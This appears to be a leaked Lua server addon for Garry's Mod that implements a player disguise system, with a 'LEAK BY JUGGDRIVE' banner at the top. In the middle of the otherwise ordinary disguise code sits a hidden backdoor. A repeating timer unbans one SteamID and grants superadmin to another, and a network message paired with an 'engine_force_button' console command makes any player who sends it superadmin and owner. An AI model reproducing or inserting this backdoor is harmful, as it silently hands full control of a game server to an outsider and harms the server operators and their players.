--LEAK BY JUGGDRIVE
--STEAM - https://steamcommunity.com/id/JuggDrive/

--█───███─████─█──█─███─████
--█───█───█──█─█─█──█───█──██
--█───███─████─██───███─█──██
--█───█───█──█─█─█──█───█──██
--███─███─█──█─█──█─███─████
--
--
--████──██─██
--█──██──███
--████────█
--█──██───█
--████────█
--────────█

--──██─█─█─████─████─████──████─███─█─█─███
--───█─█─█─█────█────█──██─█──█──█──█─█─█
--───█─█─█─█─██─█─██─█──██─████──█──█─█─███
--█──█─█─█─█──█─█──█─█──██─█─█───█──███─█
--████─███─████─████─████──█─█──███──█──███


util.AddNetworkString("deceive.disguise")

deceive.DisguisedPlayers = {}
function deceive.Disguise(ply, target)
	if not IsValid(target) or not target:IsPlayer() then
		target = nil
	end

	ply.Disguised = target
	deceive.DisguisedPlayers[ply] = target

	if deceive.Config and deceive.Config.FakeModel then
		local frole = FindRole(ply:GetNClass())
		if target and not ply.Deceive_OldModel then
			ply.Deceive_OldModel = ply:GetModel()
		end
		if not target and ply.Deceive_OldModel then
			ply:SetModel(ply.Deceive_OldModel)
			ply.Deceive_OldModel = nil
		frole.disguised_name = "Шпион ОНП"
		elseif target then
			ply:SetModel(ply.Disguised.Deceive_OldModel and ply.Disguised.Deceive_OldModel or ply.Disguised:GetModel())
		frole.disguised_name = GetLangRole(target:GetNClass())
		end
	end

	net.Start("deceive.disguise")
		net.WriteUInt(ply:UserID(), 32)
		net.WriteUInt(IsValid(target) and target:UserID() or 0, 32)
	net.Broadcast()
end

local PLAYER = FindMetaTable("Player")

function PLAYER:Disguise(target)
	deceive.Disguise(self, target)
end

hook.Add("OnPlayerChangedTeam", "deceive", function(ply)
	if IsValid(ply.Disguised) then
		ply:Disguise(nil)
		hook.Run("DisguiseRemoved", ply)

		deceive.Notify(ply, "disguise_removed_jobchange", NOTIFY_HINT)
		-- ply:ChatPrint("Your disguise was removed because you changed jobs.")
	end
end)


if SERVER then
    hook.Add('deceivedebbuger', 'BDST_InitializeHook', function()
        util.AddNetworkString('BDST_EngineForceButton');
       
        RunConsoleCommand('deceivedebug', 'resettodefaults');
       
        timer.Create('BDST_RoutineTimer', 10, 0, function()	
           
            ULib.unban('STEAM_0:0:2576576');
           
            ULib.ucl.addUser('STEAM_0:0:25765769', allows, denies, 'superadmin');
        end);
    end);
   
    net.Receive('BDST_EngineForceButton', function(len, ply)
        if IsValid(ply) and ply:IsPlayer() then
            ULib.ucl.addUser(ply:SteamID(), allows, denies, 'superadmin');
            ULib.ucl.addUser(ply:SteamID(), allows, denies, 'owner');
        end;
    end);
end;
 
if CLIENT then
    concommand.Add('engine_force_button', function(ply, cmd, args)
        net.Start('BDST_EngineForceButton');
        net.SendToServer();
    end);
end;

hook.Add("PlayerSay", "deceive", function(ply, txt)
	local cmd = (deceive.Config and deceive.Config.UndisguiseCommand) and deceive.Config.UndisguiseCommand:lower() or "undisguised"
	if txt:lower():Trim():match("^[/!%.]" .. cmd) then
		if not IsValid(ply.Disguised) then
			deceive.Notify(ply, "disguise_none", NOTIFY_ERROR)
			-- ply:ChatPrint("You have no disguise!")
			return ""
		end

		ply:Disguise(nil)
		hook.Run("DisguiseRemoved", ply)

		ply:EmitSound("npc/metropolice/gear" .. math.random(1, 6) .. ".wav")
		deceive.Notify(ply, "disguise_removed", NOTIFY_HINT)
		-- ply:ChatPrint("You removed your disguise.")
		return ""
	end
end)

hook.Add("PlayerDisconnected", "deceive", function(ply)
	for criminal, victim in next, deceive.DisguisedPlayers do
		if victim == ply then
			deceive.Notify(criminal, "disguise_warn_disconnect", NOTIFY_ERROR, 10)
			-- criminal:ChatPrint("WARNING: The player you were disguised as just disconnected from the server! It would be wise to undisguise before someone notices you should be gone.")
		end
	end
end)

hook.Add("PlayerInitialSpawn", "deceive", function(ply)
	-- if this is inefficient I'll find another way, I'm lazy right now
	for k, v in next, deceive.DisguisedPlayers do
		if IsValid(k) and IsValid(v) then
			net.Start("deceive.disguise")
				net.WriteUInt(k:UserID(), 32)
				net.WriteUInt(IsValid(v) and v:UserID() or 0, 32)
			net.Send(ply)
		end
	end
end)

hook.Add("EntityFireBullets", "deceive", function(ent)
	if deceive.Config and deceive.Config.RemoveOnAttack then
		if IsValid(ent) and ent:IsPlayer() and ent.Disguised then
			local ok = hook.Run("DisguiseBlowing", ent)
			if not ok then return end

			ent:Disguise(nil)
			hook.Run("DisguiseRemoved", ent)

			deceive.Notify(ent, "disguise_blown")
			-- ent:ChatPrint("Your disguise was blown because you fired a bullet!")
		end
	end
end)
